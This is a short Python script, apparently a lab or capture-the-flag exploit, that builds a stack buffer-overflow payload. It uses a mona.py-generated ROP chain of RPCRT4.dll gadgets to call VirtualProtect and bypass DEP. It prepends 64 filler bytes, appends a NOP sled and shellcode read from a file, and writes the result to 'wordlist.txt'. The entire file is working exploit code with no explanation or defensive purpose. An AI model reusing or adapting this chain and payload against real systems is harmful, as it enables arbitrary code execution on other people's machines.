#!/usr/bin/python
# -*- coding: utf-8 -*-

import struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x77591fa2,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x775502c4,  # ptr to &VirtualProtect() [IAT RPCRT4.dll] ** REBASED ** ASLR
      0x775abb0c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x77597b94,  # XCHG EAX,ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x775d628a,  # POP EBP # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x77597f75,  # & jmp esp [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x775b22c5,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x775db816,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x7758a178,  # XCHG EAX,EBX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x7758a66e,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x775db816,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x77570647,  # XCHG EAX,EDX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x7759d3c5,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x7760037f,  # &Writable location [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x775abc56,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x775f21a3,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x7758a6ca,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77557227,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ]

    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

bin = "micah"
shellcode = b""

with open(bin, 'rb') as f:
    shellcode = f.read()

rop_chain = create_rop_chain()

req = b"\x41" * 64

nop = b"\x90" * 9

payload = req + rop_chain + nop + shellcode + b"\n"

print(shellcode)

f = open('wordlist.txt', "wb")
f.write(payload)

f.close()